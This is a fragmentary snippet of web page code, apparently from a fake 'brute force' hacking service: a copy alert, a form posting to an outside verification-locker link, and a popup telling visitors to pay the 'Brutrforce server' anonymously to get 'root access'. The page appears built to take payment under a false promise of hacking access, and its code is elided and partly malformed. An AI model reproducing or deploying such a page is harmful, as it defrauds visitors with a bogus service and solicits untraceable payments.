...
  alert("Copied the text: " + copyText.value);
		 ...
		 <form action="https://www.verifysuper.com/cl/v/ve9ld" method=""> <div class="user-box"> 
...
Swal.fire({
  ...
  html:"<p style="color:green;"><br>Steps to Grant Root Access!!</br></p><br>👉<b>1.Make payment to the Brutrforce server<br><br><br>👉<b>2.Get an evidence of payment with the address use for payment (optional). eg: A screenshot or photograph<br><br><b>Note :</b> This method is anonymous ⚠️ ",
  customClass: {
    icon: 'no-border'
  }
});</script>
